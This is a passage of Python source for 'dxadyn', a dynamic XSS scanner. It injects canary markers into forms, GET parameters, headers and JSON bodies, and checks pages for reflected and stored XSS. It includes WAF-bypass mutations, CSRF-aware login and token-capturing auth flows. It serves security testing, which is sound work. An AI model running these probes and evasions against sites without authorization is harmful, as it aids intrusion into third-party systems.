    Phase 1.1: (field × variant) tasks are flattened into one work list and
    run via _parallel_map, so --parallel N submits them in parallel while
    preserving input order in the result."""
    variants = variants or ["body"]
    fields = list(form["fields"]) or []
    tasks = []
    for target in fields:
        for vname, cid, canary, marker in make_canaries_for(variants, waf_bypass):
            tasks.append((target, vname, cid, canary, marker))

    def _probe_one(task):
        target, vname, cid, canary, marker = task
        data = {k: (canary if k == target else (form["fields"][k] or "dxa"))
                for k in fields}
        if form["method"] == "post":
            status, _, body, _ct = fetch(form["action"], data=data)
        else:
            url = form["action"] + ("&" if "?" in form["action"] else "?") + \
                urllib.parse.urlencode(data)
            status, _, body, _ct = fetch(url)
        v = verdict(cid, body, marker)
        if v in ("unencoded", "attr-only"):
            ctx = find_context(cid, body or "")
            return _finding(form["action"], form["method"], target, v, status,
                            context=ctx, canary_id=cid, content_type=_ct,
                            variant=vname)
        _maybe_record_skip(v, cid, form["action"], form["method"],
                           vname, status, body, canary)
        return None

    return [f for f in _parallel_map(_probe_one, tasks) if f is not None]


def probe_link(link, variants=None, waf_bypass=False):
    """Inject a canary into each existing GET param in turn; v3.10: fan-out.
    Phase 1.1: parallelised same way as probe_form."""
    variants = variants or ["body"]
    parts = urllib.parse.urlsplit(link)
    params = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    tasks = []
    for i, (name, _) in enumerate(params):
        for vname, cid, canary, marker in make_canaries_for(variants, waf_bypass):
            tasks.append((i, name, vname, cid, canary, marker))

    def _probe_one(task):
        i, name, vname, cid, canary, marker = task
        newq = [(n, canary if j == i else v) for j, (n, v) in enumerate(params)]
        url = urllib.parse.urlunsplit(parts._replace(query=urllib.parse.urlencode(newq)))
        status, _, body, _ct = fetch(url)
        v = verdict(cid, body, marker)
        if v in ("unencoded", "attr-only"):
            ctx = find_context(cid, body or "")
            return _finding(f"{parts.scheme}://{parts.netloc}{parts.path}",
                            "GET", name, v, status,
                            context=ctx, canary_id=cid, content_type=_ct,
                            variant=vname)
        _maybe_record_skip(v, cid, url, "GET",
                           vname, status, body, canary)
        return None

    return [f for f in _parallel_map(_probe_one, tasks) if f is not None]


def _finding(where, method, param, v, status, context="unknown", canary_id=None,
             content_type="", variant="body"):
    conf = "high" if v == "unencoded" else "medium"
    # v3.7 + v3.10: CT gate + variant-aware severity
    ctx, sev = _apply_ct_gate(v, context, content_type, variant)
    return {"url": where, "method": method.upper(), "param": param,
            "reflection": v, "confidence": conf, "status": status,
            "context": ctx, "severity": sev,
            "canary_id": canary_id, "content_type": content_type,
            "variant": variant}


def crawl(base_url, depth, variants=None, waf_bypass=False):
    """Reflected-mode crawler. v3.10: `variants` + `waf_bypass` fan-out is
    plumbed through to every probe_form / probe_link call so a single
    reflected-mode run can try body / title-breakout / attr-breakout /
    script-breakout / url-scheme (+ optional 4 WAF mutations each) on
    every form field and GET param it discovers."""
    variants = variants or ["body"]
    seen_pages, findings, queue = set(), [], [(base_url, depth)]
    host = urllib.parse.urlsplit(base_url).netloc
    while queue:
        url, d = queue.pop(0)
        if url in seen_pages:
            continue
        seen_pages.add(url)
        status, final, body, _ct = fetch(url)
        if not body or body.startswith("__error__"):
            continue
        forms, links = discover(final, body)
        for f in forms:
            findings += probe_form(f, variants=variants, waf_bypass=waf_bypass)
        for l in links:
            findings += probe_link(l, variants=variants, waf_bypass=waf_bypass)
        if d > 0:
            for l in links:
                if urllib.parse.urlsplit(l).netloc == host and l not in seen_pages:
                    queue.append((l.split("?")[0], d - 1))
    # de-dupe on (url, param, reflection, variant) - variant-aware so a
    # body + title-breakout reflection on the same param stays as 2 rows
    uniq, keys = [], set()
    for f in findings:
        k = (f["url"], f["param"], f["reflection"], f.get("variant", "body"))
        if k not in keys:
            keys.add(k)
            uniq.append(f)
    return uniq


# --- v2: authenticated + stored XSS -----------------------------------------

import re


def _extract_csrf(body, field):
    """Grab a CSRF token value out of the login page's HTML (field name-agnostic)."""
    m = re.search(r'name="' + re.escape(field) + r'"[^>]*value="([^"]+)"', body) \
        or re.search(r'value="([^"]+)"[^>]*name="' + re.escape(field) + r'"', body)
    return m.group(1) if m else None


def _cookie_jar():
    """Reach into OPENER for its CookieJar (installed by _opener())."""
    for h in OPENER.handlers:
        if isinstance(h, urllib.request.HTTPCookieProcessor):
            return h.cookiejar
    return None


def login(login_url, user, password, user_field="username", pass_field="password",
          csrf_field="tokenCSRF", extra=None):
    """Log in through a standard HTML form. Session cookies live in `OPENER`.
    Success = the POST either landed us on a different URL (redirect out of
    the login page) *or* set at least one new cookie we did not have before."""
    status, _, body, _ct = fetch(login_url)
    if status is None:
        return False

    jar = _cookie_jar()
    before = len(list(jar)) if jar is not None else 0

    data = {user_field: user, pass_field: password}
    tok = _extract_csrf(body, csrf_field) if csrf_field else None
    if tok is not None:
        data[csrf_field] = tok
    if extra:
        data.update(extra)

    st, final_url, _, _ct = fetch(login_url, data=data)
    if st is None:
        return False
    after = len(list(jar)) if jar is not None else 0
    return final_url != login_url or after > before


def _do_submit(target_url, target_field, extra_fields, canary,
               method="post", csrf_field="tokenCSRF",
               json_body=None, header_target=None):
    """Dispatch to the right submit style. `method` propagates to all three
    (form/json/header) so REST endpoints that want PUT/PATCH/DELETE work."""
    if json_body is not None:
        return _submit_json(target_url, json_body, canary, method=method)
    if header_target:
        return _submit_header(target_url, header_target, canary, method=method)
    return _submit_form(target_url, target_field, extra_fields, canary,
                        method=method, csrf_field=csrf_field)


def probe_stored(target_url, target_field, extra_fields, check_urls,
                 method="post", csrf_field="tokenCSRF",
                 json_body=None, header_target=None,
                 variants=None, waf_bypass=False):
    """Submit payloads, look for each on the check URL(s). Shape of the
    submission is form / json / header (see probe_stored_auto). `variants` is
    a list of payload-variant names to fan out through - each gets its own
    cid, submit, and check pass. If `waf_bypass` is set, every variant also
    generates its 4 mutation shapes (case-swap / split-tag-comment /
    whitespace / URL-encode). Default `['body']`, `waf_bypass=False` =
    historical single-shape behaviour."""
    variants = variants or ["body"]
    label = (f"header:{header_target}" if header_target else
             ("json" if json_body is not None else target_field))
    # Phase 1.1: fan the variant loop out in parallel. Each unit does its
    # own submit + all check URLs for that variant. Findings are gathered
    # in input order.
    canaries = list(make_canaries_for(variants, waf_bypass))
    cids = [cid for _, cid, _, _ in canaries]

    def _one_variant(triple):
        vname, cid, canary, marker = triple
        rows = []
        sub_status, _ = _do_submit(target_url, target_field, extra_fields, canary,
                                   method=method, csrf_field=csrf_field,
                                   json_body=json_body, header_target=header_target)
        # Phase 0.2: submit-layer skip observability
        sub_was_skip, sub_reason = _classify_response(sub_status, "")
        if sub_was_skip:
            _record_skip(cid, target_url, method, vname, sub_status,
                         f"submit:{sub_reason}", canary)
        for raw_url in check_urls:
            url = raw_url.replace("{CID}", cid)
            st, _, body, _ct = fetch(url)
            v = verdict(cid, body or "", marker)
            if v in ("unencoded", "attr-only"):
                raw_ctx = find_context(cid, body or "")
                ctx, sev = _apply_ct_gate(v, raw_ctx, _ct, vname)
                rows.append({"target": target_url, "field": label, "check_url": url,
                             "reflection": v, "confidence": "high" if v == "unencoded" else "medium",
                             "sub_status": sub_status, "check_status": st, "canary_id": cid,
                             "context": ctx, "severity": sev, "content_type": _ct,
                             "variant": vname})
            else:
                _maybe_record_skip(v, cid, url, "GET",
                                   f"{vname}[check]", st, body, canary)
        return rows

    per_variant_rows = _parallel_map(_one_variant, canaries)
    out = [row for group in per_variant_rows for row in group]
    # Return first cid for backward-compat single-variant callers; the full list
    # is on findings[i].canary_id for multi-variant callers.
    return out, cids[0] if cids else ""


# --- v3.2: auto-discover check URLs (crawl after submit) --------------------

class _AllLinks(HTMLParser):
    """Collects EVERY <a href> (not just param-carrying ones). Used only by the
    auto-check crawler; the reflected-mode probe_link path still uses the
    parameter-only FormParser filter."""
    def __init__(self):
        super().__init__()
        self.hrefs = []

    def handle_starttag(self, tag, attrs):
        if tag == "a":
            for k, v in attrs:
                if k == "href" and v:
                    self.hrefs.append(v)
                    break


def _all_links(base_url, body):
    p = _AllLinks()
    try:
        p.feed(body)
    except Exception:                                        # noqa: BLE001
        pass
    seen, out = set(), []
    for h in p.hrefs:
        if h.startswith(("javascript:", "mailto:", "tel:", "#")):
            continue
        u = urllib.parse.urljoin(base_url, h)
        # strip fragment; keep query (some slugs use query params)
        u = urllib.parse.urldefrag(u)[0]
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out


def _submit_form(target_url, target_field, extra_fields, canary,
                 method="post", csrf_field="tokenCSRF"):
    """Fetch the target once (to grab CSRF), then submit with the canary in
    `target_field`. `method` accepts get/post; PUT/PATCH/DELETE send the form
    as urlencoded body with the explicit method. Returns (status, final_url)."""
    tok = None
    if csrf_field:
        st, _, body, _ct = fetch(target_url)
        if st is not None:
            tok = _extract_csrf(body, csrf_field)
    data = dict(extra_fields or {})
    data[target_field] = canary
    if tok is not None and csrf_field:
        data[csrf_field] = tok
    m = method.upper()
    if m == "GET":
        sep = "&" if "?" in target_url else "?"
        st, final, _, _ct = fetch(target_url + sep + urllib.parse.urlencode(data))
    elif m == "POST":
        st, final, _, _ct = fetch(target_url, data=data)
    else:
        st, final, _, _ct = fetch(target_url, data=data, method=m)
    return st, final


def _fetch_json(url, body_bytes, method="POST"):
    """Send a JSON body with Content-Type: application/json. Any HTTP method
    is accepted (POST default; PUT/PATCH/DELETE for REST endpoints)."""
    saved = EXTRA_HEADERS.get("Content-Type")
    EXTRA_HEADERS["Content-Type"] = "application/json"
    try:
        result = fetch(url, data=bytes(body_bytes), method=method)
    finally:
        if saved is None:
            EXTRA_HEADERS.pop("Content-Type", None)
        else:
            EXTRA_HEADERS["Content-Type"] = saved
    return result


def _submit_json(target_url, json_template, canary, method="POST"):
    """Send `json_template` (with `{CANARY}` substituted) to target_url as
    application/json. Method defaults to POST; REST APIs often need PUT/PATCH,
    which callers pass through. Returns (submit_status, landing_url)."""
    safe = json_template.replace("{CANARY}", canary
        .replace("\\", "\\\\").replace('"', '\\"'))
    st, final, _, _ct = _fetch_json(target_url, safe.encode("utf-8"), method=method)
    return st, final


def _submit_header(target_url, header_name, canary, method="GET"):
    """Send target_url once with `canary` in `header_name`. Any HTTP method
    is supported. Phase 1.1: passes the header via fetch(extra=...) rather
    than mutating EXTRA_HEADERS - which was not thread-safe under --parallel
    (two threads racing on the same key)."""
    m = method.upper()
    hdr = {header_name: canary}
    if m == "GET":
        st, final, _, _ct = fetch(target_url, extra=hdr)
    elif m == "POST":
        st, final, _, _ct = fetch(target_url, data={}, extra=hdr)
    else:
        # PUT/PATCH/DELETE with empty body
        st, final, _, _ct = fetch(target_url, data=b"", method=m, extra=hdr)
    return st, final


def probe_stored_auto(target_url, target_field, extra_fields, seed_urls,
                      method="post", csrf_field="tokenCSRF", max_links=60,
                      json_body=None, header_target=None, variants=None,
                      waf_bypass=False):
    """Submit payload(s) then autonomously hunt for the canary via 1-hop crawl.
    v3.10: `variants` fans out into per-variant submits; each variant produces
    its own findings (own cid + own marker). `waf_bypass` also fans each
    variant into 4 mutation shapes. Candidate URLs are crawled once and
    every candidate is verdicted against every submitted cid - one HTTP
    fetch per candidate, N verdicts, cheap."""
    variants = variants or ["body"]
    label = (f"header:{header_target}" if header_target else
             ("json" if json_body is not None else target_field))

    # Phase 1: submit each variant. Phase 1.1: parallelised via _parallel_map;
    # each unit returns its (vname, cid, marker, sub_status, canary, landing)
    # tuple. The first landing URL (input order) becomes the crawl seed root.
    canaries = list(make_canaries_for(variants, waf_bypass))

    def _one_submit(quad):
        vname, cid, canary, marker = quad
        sub_status, this_landing = _do_submit(
            target_url, target_field, extra_fields, canary,
            method=method, csrf_field=csrf_field,
            json_body=json_body, header_target=header_target)
        sub_was_skip, sub_reason = _classify_response(sub_status, "")
        if sub_was_skip:
            _record_skip(cid, target_url, method, vname, sub_status,
                         f"submit:{sub_reason}", canary)
        return (vname, cid, marker, sub_status, this_landing)

    _results = _parallel_map(_one_submit, canaries)
    submits = [(v, c, m, s) for (v, c, m, s, _l) in _results]
    landing = next((l for _v, _c, _m, _s, l in _results if l), "")
    first_cid = submits[0][1] if submits else ""

    # Phase 2: assemble crawl seeds. {CID} in user seeds is replaced with the
    # FIRST variant's cid (single-variant back-compat); other variants share
    # the crawl surface. If N variants have different slugs, extra seed
    # templates can be passed with the pattern replicated - future refinement.
    origin = urllib.parse.urlsplit(target_url)
    root = f"{origin.scheme}://{origin.netloc}/"
    resolved_seeds = [u.replace("{CID}", first_cid) for u in (seed_urls or [])]
    seeds, seen_seeds = [], set()
    for u in resolved_seeds + ([landing] if landing else []) + [root]:
        if u and u not in seen_seeds:
            seen_seeds.add(u)
            seeds.append(u)

    host = origin.netloc
    candidates, seen = [], set()
    for seed in seeds:
        if seed not in seen:
            seen.add(seed)
            candidates.append(seed)
        st, _, body, _ct = fetch(seed)
        if not body or body.startswith("__error__"):
            continue
        for link in _all_links(seed, body):
            if urllib.parse.urlsplit(link).netloc != host:
                continue
            if link in seen:
                continue
            seen.add(link)
            candidates.append(link)
            if len(candidates) >= max_links:
                break
        if len(candidates) >= max_links:
            break

    # Phase 3: fetch each candidate once, verdict against every variant.
    # Phase 1.1: candidate fetches run in parallel (each fetch is
    # independent - dedup happens after aggregation).
    def _fetch_and_verdict(cand_url):
        st, _, body, _ct = fetch(cand_url)
        if not body:
            return []
        rows = []
        for vname, cid, marker, sub_status in submits:
            if cid not in body:
                continue
            v = verdict(cid, body, marker)
            if v in ("unencoded", "attr-only"):
                raw_ctx = find_context(cid, body or "")
                ctx, sev = _apply_ct_gate(v, raw_ctx, _ct, vname)
                rows.append({"target": target_url, "field": label,
                             "check_url": cand_url, "reflection": v,
                             "confidence": "high" if v == "unencoded" else "medium",
                             "sub_status": sub_status, "check_status": st,
                             "canary_id": cid, "auto_discovered": True,
                             "context": ctx, "severity": sev, "content_type": _ct,
                             "variant": vname})
        return rows

    per_cand = _parallel_map(_fetch_and_verdict, candidates)
    findings = [row for group in per_cand for row in group]
    checked = len(candidates)

    findings = dedupe_findings(findings)
    return findings, first_cid, {"submit_landing": landing, "checked_pages": checked,
                                 "candidates": len(candidates)}


def probe_headers(url, header_names, variants=None, waf_bypass=False):
    """Send `url` per header × per variant, each carrying a fresh canary in
    that header value, and verdict the response. v3.10: variants fan-out
    means a header probe can try body / title-breakout / attr-breakout /
    script-breakout / url-scheme (+ optional 4 WAF mutations) per header."""
    variants = variants or ["body"]

    # Phase 1.1: flatten (header × variant) into one work list so the
    # ThreadPoolExecutor can hit them all in parallel via _parallel_map.
    tasks = []
    for name in header_names:
        for vname, cid, canary, marker in make_canaries_for(variants, waf_bypass):
            tasks.append((name, vname, cid, canary, marker))

    def _probe_one(task):
        name, vname, cid, canary, marker = task
        # per-request header via fetch(extra=), no global mutation -> thread-safe
        status, _, body, _ct = fetch(url, extra={name: canary})
        v = verdict(cid, body or "", marker)
        if v in ("unencoded", "attr-only"):
            raw_ctx = find_context(cid, body or "")
            ctx, sev = _apply_ct_gate(v, raw_ctx, _ct, vname)
            return {
                "url": url, "method": "GET", "param": f"header:{name}",
                "reflection": v,
                "confidence": "high" if v == "unencoded" else "medium",
                "status": status, "context": ctx,
                "severity": sev, "canary_id": cid, "content_type": _ct,
                "variant": vname,
            }
        _maybe_record_skip(v, cid, url, "GET",
                           f"{vname}[hdr:{name}]", status, body, canary)
        return None

    return [f for f in _parallel_map(_probe_one, tasks) if f is not None]


def render_html(findings, target, mode, meta=None):
    """Self-contained HTML report - no external assets. Same visual language as
    dxa's report (dark GitHub-ish theme, severity/confidence badges) so the two
    tools' outputs feel like one product. `meta` is a dict of extra context
    lines to print in the sub-header (submit landing, pages crawled, ...)."""
    def esc(s):
        return htmllib.escape(str(s))

    color = {"high": "#f85149", "medium": "#d29922", "low": "#8b949e",
             "unencoded": "#f85149", "attr-only": "#d29922",
             "executable": "#f85149", "breakout-req": "#d29922",
             "attr-breakout": "#d29922"}
    total = len(findings)
    execs = sum(1 for f in findings if f.get("severity") == "executable")
    breakout = sum(1 for f in findings if f.get("severity") == "breakout-req")
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")

    rows = []
    for f in findings:
        # findings may come from reflected (crawl/link/header) or stored modes.
        # Normalise the display fields.
        param = f.get("param") or f.get("field") or "-"
        url = f.get("check_url") or f.get("url") or "-"
        method = f.get("method") or ("stored" if "field" in f else "GET")
        refl = f.get("reflection", "-")
        ctx = f.get("context", "-")
        sev = f.get("severity", "-")
        origin = f.get("origin") or (
            "stored-auto" if f.get("auto_discovered") else
            "stored" if "check_url" in f else "reflected")
        sub_st = f.get("sub_status")
        chk_st = f.get("check_status") or f.get("status")
        status = f"submit HTTP {sub_st}, check HTTP {chk_st}" if sub_st is not None \
            else f"HTTP {chk_st}"
        dups = f.get("duplicates") or []
        dup_note = f" <span class='muted small'>(+{len(dups)} more same-bug URLs)</span>" if dups else ""
        rows.append(
            "<tr>"
            f"<td><span class='badge' style='background:{color.get(sev,'#8b949e')}'>"
            f"{esc(sev.upper())}</span></td>"
            f"<td class='mono small'>{esc(ctx)}</td>"
            f"<td><span class='badge' style='background:{color.get(refl,'#8b949e')}'>"
            f"{esc(refl)}</span></td>"
            f"<td class='mono'>{esc(origin)}</td>"
            f"<td class='mono'>{esc(method)}</td>"
            f"<td class='mono'>{esc(param)}</td>"
            f"<td class='mono muted url'>{esc(url)}{dup_note}</td>"
            f"<td class='muted small'>{esc(status)}</td>"
            "</tr>"
        )

    meta_html = ""
    if meta:
        meta_html = "<ul class='meta'>" + "".join(
            f"<li><b>{esc(k)}:</b> <span class='mono'>{esc(v)}</span></li>"
            for k, v in meta.items() if v is not None
        ) + "</ul>"

    return f"""<!doctype html>
<meta charset="utf-8">
<title>dxadyn report - {esc(target)}</title>
<style>
 body{{font-family:system-ui,Arial,sans-serif;background:#0d1117;color:#e6edf3;margin:0;padding:28px}}
 h1{{font-size:20px;margin:0 0 4px}} .sub{{color:#8b949e;font-size:13px;margin-bottom:12px}}
 .stats{{display:flex;gap:14px;margin:18px 0 12px;flex-wrap:wrap}}
 .stat{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:10px 16px;min-width:110px}}
 .stat .n{{font-size:22px;font-weight:700}} .stat .l{{color:#8b949e;font-size:12px;text-transform:uppercase;letter-spacing:.5px}}
 .meta{{list-style:none;padding:10px 14px;margin:0 0 18px;background:#161b22;border:1px solid #30363d;border-radius:8px;font-size:13px}}
 .meta li{{margin:2px 0}} .meta b{{color:#8b949e;font-weight:600;text-transform:uppercase;font-size:11px;letter-spacing:.5px}}
 table{{width:100%;border-collapse:collapse;font-size:13px}}
 th,td{{text-align:left;padding:9px 10px;border-bottom:1px solid #21262d;vertical-align:top}}
 th{{color:#8b949e;text-transform:uppercase;font-size:11px;letter-spacing:.5px}}
 .badge{{color:#0d1117;font-weight:700;font-size:11px;padding:2px 8px;border-radius:10px;text-transform:uppercase}}
 .mono{{font-family:ui-monospace,Consolas,monospace}} .muted{{color:#8b949e}}
 .small{{font-size:11px}} .url{{word-break:break-all;color:#79c0ff}}
 .warn{{background:#3d1d0a;border:1px solid #d29922;color:#e6edf3;padding:8px 12px;border-radius:6px;margin:14px 0;font-size:12px}}
 footer{{color:#8b949e;font-size:12px;margin-top:22px}}
</style>
<h1>dxadyn - dynamic XSS report</h1>
<div class="sub">target: <span class="mono">{esc(target)}</span> &middot; mode: <span class="mono">{esc(mode)}</span> &middot; generated: {esc(ts)}</div>
{meta_html}
<div class="stats">
 <div class="stat"><div class="n">{total}</div><div class="l">unique candidates</div></div>
 <div class="stat"><div class="n" style="color:{color['executable']}">{execs}</div><div class="l">executable</div></div>
 <div class="stat"><div class="n" style="color:{color['breakout-req']}">{breakout}</div><div class="l">needs breakout</div></div>
</div>
{"<div class='warn'>EXECUTABLE = a raw &lt;img onerror&gt; payload runs as-is (body/free context). NEEDS-BREAKOUT = the value survives raw but is inside &lt;title&gt; / &lt;script&gt; / an attribute value, so a follow-on payload (e.g. &lt;/title&gt; or a &quot; breakout) is required for real execution.</div>" if findings else ""}
<table>
 <tr><th>severity</th><th>context</th><th>reflection</th><th>origin</th><th>method</th><th>param</th><th>url</th><th>status</th></tr>
 {"".join(rows) if rows else "<tr><td colspan=8 class='muted'>No unencoded reflections found. (Inputs may be encoded, POST-guarded, or absent.)</td></tr>"}
</table>
<footer>dxadyn - deterministic dynamic XSS verifier. Companion of <span class='mono'>dxa</span>. Authorized targets only.</footer>
"""


def _parse_kv_list(text):
    """`a=1,b=hi,c=` -> {'a': '1', 'b': 'hi', 'c': ''} (values may not contain '=' commas)."""
    if not text:
        return {}
    out = {}
    for pair in text.split(","):
        if "=" not in pair:
            continue
        k, v = pair.split("=", 1)
        out[k.strip()] = v
    return out


# --- Phase 1.3: JSON workflow chaining (state machine) --------------------
#
# The engine reads a flow definition (register -> post -> verify pattern),
# threads variables between steps, substitutes {VAR}/{RND}/{CANARY}/{CID}
# placeholders, and runs the final verdict against the canary marker.
# Zero-dep: JSON instead of YAML so no PyYAML dependency creeps in.
#
# Flow shape (see bench/flows/*.json for examples):
#   {
#     "name": "register-comment-verify",
#     "steps": [
#       {"name": "reg", "method": "POST", "url": "/api/register",
#        "body": {"email": "u-{RND}@x.com"},
#        "content_type": "application/json",
#        "save": {"token": "$.token", "uid": "$.user.id"}},
#       {"name": "post", "method": "POST", "url": "/api/comments",
#        "headers": {"Authorization": "Bearer {token}"},
#        "body": {"text": "{CANARY}"},
#        "content_type": "application/json"},
#       {"name": "check", "method": "GET",
#        "url": "/comments/{uid}", "verdict": true}
#     ]
#   }

def _jsonpath_get(data, expr):
    """Tiny JSONPath subset. Supports `$`, `.key`, `[N]`, `[*]`.

    Returns the extracted value, or None if any hop misses.
    Not a full spec - we deliberately keep it narrow so a flow author
    always knows what a path resolves to.
    """
    if not expr or not expr.startswith("$"):
        return None
    cur = data
    i = 1
    while i < len(expr):
        c = expr[i]
        if c == ".":
            j = i + 1
            while j < len(expr) and expr[j] not in ".[":
                j += 1
            key = expr[i + 1:j]
            if not isinstance(cur, dict) or key not in cur:
                return None
            cur = cur[key]
            i = j
        elif c == "[":
            j = expr.find("]", i)
            if j == -1:
                return None
            token = expr[i + 1:j]
            if token == "*":
                if not isinstance(cur, list):
                    return None
                # star returns list of all children; caller decides
                cur = list(cur)
            else:
                try:
                    idx = int(token)
                except ValueError:
                    return None
                if not isinstance(cur, list) or not (-len(cur) <= idx < len(cur)):
                    return None
                cur = cur[idx]
            i = j + 1
        else:
            return None
    return cur


_PLACEHOLDER_RE = re.compile(r"\{([A-Z0-9_]+|[a-z][a-zA-Z0-9_]*)\}")


def _substitute(value, vars_):
    """Recursively substitute `{NAME}` placeholders in strings inside
    value (which may be a str, dict, list, or primitive). `vars_` is the
    running namespace: {RND, CANARY, CID, ...saved from previous steps}.

    A missing placeholder is left as-is (`{unknown}` stays literal) so
    the flow author can spot the typo in the sent request rather than
    the engine silently substituting empty."""
    if isinstance(value, str):
        def _rep(m):
            key = m.group(1)
            if key in vars_:
                return str(vars_[key])
            return m.group(0)
        return _PLACEHOLDER_RE.sub(_rep, value)
    if isinstance(value, dict):
        return {k: _substitute(v, vars_) for k, v in value.items()}
    if isinstance(value, list):
        return [_substitute(v, vars_) for v in value]
    return value


def _fetch_flow_step(method, url, body, headers, content_type, timeout=10):
    """Issue one HTTP request as part of a flow. Returns
    (status, body_text, content_type_header, parsed_json_or_None)."""
    method = (method or "GET").upper()
    data = None
    if body is not None:
        if isinstance(body, (dict, list)) and content_type and \
                "application/json" in content_type.lower():
            data = json.dumps(body).encode("utf-8")
        elif isinstance(body, (dict, list)):
            data = urllib.parse.urlencode(body).encode("utf-8")
        elif isinstance(body, str):
            data = body.encode("utf-8")
        else:
            data = str(body).encode("utf-8")
    req = urllib.request.Request(url, data=data, method=method)
    if content_type:
        req.add_header("Content-Type", content_type)
    for h, hv in (headers or {}).items():
        req.add_header(h, hv)
    for h, hv in EXTRA_HEADERS.items():
        req.add_header(h, hv)
    _rate_gate()
    _jitter_gate()
    try:
        with OPENER.open(req, timeout=timeout) as resp:
            raw = resp.read()
            ct = resp.headers.get("Content-Type", "")
            status = resp.status
    except urllib.error.HTTPError as e:
        raw = e.read() or b""
        ct = e.headers.get("Content-Type", "") if e.headers else ""
        status = e.code
    except Exception as e:
        return 0, f"__error__ {e}", "", None
    text = raw.decode("utf-8", errors="replace")
    parsed = None
    if "application/json" in ct.lower():
        try:
            parsed = json.loads(text)
        except (ValueError, json.JSONDecodeError):
            parsed = None
    return status, text, ct, parsed


def run_flow(flow, canary=None, cid=None, marker=None, timeout=10):
    """Execute a flow definition. Returns a summary dict:
      {
        'name': str, 'steps_run': int, 'vars': {...},
        'verdicts': [ {step, url, status, reflection, marker} ],
        'error': None | 'step_name: msg',
      }
    If any step has "verdict": true, the response body is checked for
    the canary marker after the cid (same primitive as reflected/stored
    modes). The first verdict step that finds an unencoded reflection
    stops further verdict evaluation but the flow continues to run so
    later cleanup steps can still fire.

    canary / cid / marker are threaded in as the `{CANARY}` / `{CID}` /
    `{MARKER}` placeholders. When None, a fresh body-variant canary is
    minted."""
    if canary is None or cid is None:
        cid, canary = make_canary("body")
        marker = marker or "<dXsS>"
    marker = marker or "<dXsS>"

    vars_ = {
        "CANARY": canary,
        "CID": cid,
        "MARKER": marker,
        "RND": secrets.token_hex(4),
    }
    summary = {
        "name": flow.get("name", "unnamed"),
        "steps_run": 0,
        "vars": vars_,
        "verdicts": [],
        "error": None,
    }

    for step in flow.get("steps", []):
        sname = step.get("name", f"step{summary['steps_run'] + 1}")
        url = _substitute(step.get("url", ""), vars_)
        method = step.get("method", "GET")
        body = _substitute(step.get("body"), vars_)
        headers = _substitute(step.get("headers", {}), vars_)
        content_type = step.get("content_type")

        status, text, ct, parsed = _fetch_flow_step(
            method, url, body, headers, content_type, timeout=timeout,
        )
        summary["steps_run"] += 1

        if status == 0:
            summary["error"] = f"{sname}: {text}"
            return summary

        # Save extracted values into the running namespace.
        for save_name, path in (step.get("save") or {}).items():
            src = parsed if parsed is not None else text
            if isinstance(src, (dict, list)):
                vars_[save_name] = _jsonpath_get(src, path)
            else:
                vars_[save_name] = None

        if step.get("verdict"):
            v = verdict(cid, text, marker)
            summary["verdicts"].append({
                "step": sname, "url": url, "status": status,
                "reflection": v, "marker": marker,
            })

    return summary


def _load_flow(path):
    """Load a JSON flow file, or return {'__error__': msg}."""
    try:
        with open(path) as fh:
            return json.load(fh)
    except (OSError, ValueError, json.JSONDecodeError) as e:
        return {"__error__": f"cannot load flow {path}: {e}"}


# --- Phase 1.5: macro-based auth (auth flows) ------------------------------
#
# An auth flow is just a `run_flow`-compatible spec with an optional top-level
# `auth` field describing how to install the login result into subsequent
# requests. Two shapes cover every real target we've seen:
#
#   Cookie session (default when `auth` is absent):
#     {"steps": [{"method": "POST", "url": "/login",
#                 "body": {"u": "x", "p": "y"}}]}
#     Set-Cookie responses land in the module-level OPENER's cookie jar.
#     Every later fetch() through OPENER carries them automatically. No
#     header wiring needed.
#
#   JWT / bearer / API key (explicit):
#     {"steps": [{"method": "POST", "url": "/api/login",
#                 "content_type": "application/json",
#                 "body": {"email": "x", "password": "y"},
#                 "save": {"token": "$.token"}}],
#      "auth": {"header": "Authorization", "value": "Bearer {token}"}}
#     The saved token is substituted into `auth.value` and installed into
#     EXTRA_HEADERS so every later fetch() adds the Authorization header.
#
# JWT-vs-cookie is not detected by inspecting the response; it is stated
# by the flow author via presence/absence of the `auth` field. Explicit
# beats magic - a real target sometimes issues BOTH a Set-Cookie AND a
# JWT and the author chooses which one to reuse.


def run_auth_flow(flow, timeout=10):
    """Execute an auth flow. Returns a summary dict identical in shape to
    `run_flow`'s, plus:
      - 'auth_header': (name, value) tuple actually installed, or None
      - 'authenticated': True if the flow completed AND either an auth
        header was installed OR at least one Set-Cookie landed in the jar.

    Side effect: installs the substituted auth header into EXTRA_HEADERS
    on success. The caller is responsible for undoing this if it wants
    multiple auth contexts in one process.
    """
    summary = run_flow(flow, timeout=timeout)
    summary["auth_header"] = None
    summary["authenticated"] = False

    if summary["error"]:
        return summary

    # Explicit `auth` field wins - install the header.
    auth = flow.get("auth")
    if isinstance(auth, dict) and auth.get("header") and auth.get("value"):
        header_name = auth["header"]
        header_value = _substitute(auth["value"], summary["vars"])
        # If a placeholder stayed literal ({unknown}) the token wasn't
        # captured and we should NOT install a broken header.
        if _PLACEHOLDER_RE.search(header_value):
            summary["error"] = (
                f"auth.value still has unresolved placeholder: {header_value}"
            )
            return summary
        EXTRA_HEADERS[header_name] = header_value
        summary["auth_header"] = (header_name, header_value)
        summary["authenticated"] = True
        return summary

    # No explicit auth field: assume cookie session, look for anything
    # in the cookie jar planted by the login steps.
    try:
        cj = _cookie_jar()
        summary["authenticated"] = cj is not None and len(list(cj)) > 0
    except Exception:
        summary["authenticated"] = False
    return summary


def clear_auth_header(name):
    """Remove a previously-installed auth header. Useful for tests and
    for callers that want to switch auth contexts in one process."""
    EXTRA_HEADERS.pop(name, None)


def main():
    ap = argparse.ArgumentParser(description="dynamic reflection verifier (companion to dxa)")
    ap.add_argument("url", nargs="?", help="target URL for reflected mode (authorized/local only)")
    ap.add_argument("--depth", type=int, default=0,
                    help="reflected mode: follow same-host links this many hops (default 0)")
    ap.add_argument("--probe-headers", default="",
                    help="reflected mode: comma-separated header names to inject "
                         "a canary into (e.g. 'X-Forwarded-For,True-Client-IP,"
                         "Referer,User-Agent'). Catches header-XSS.")

    ap.add_argument("--stored", action="store_true",
                    help="stored mode: submit --target once, look for the canary on --check URL(s)")
    ap.add_argument("--target", help="stored mode: URL of the form to submit")
    ap.add_argument("--target-field", help="stored mode: form field to inject the canary into")
    ap.add_argument("--extra", default="",
                    help="stored mode: extra form fields, `a=1,b=hi,c=` comma-separated")
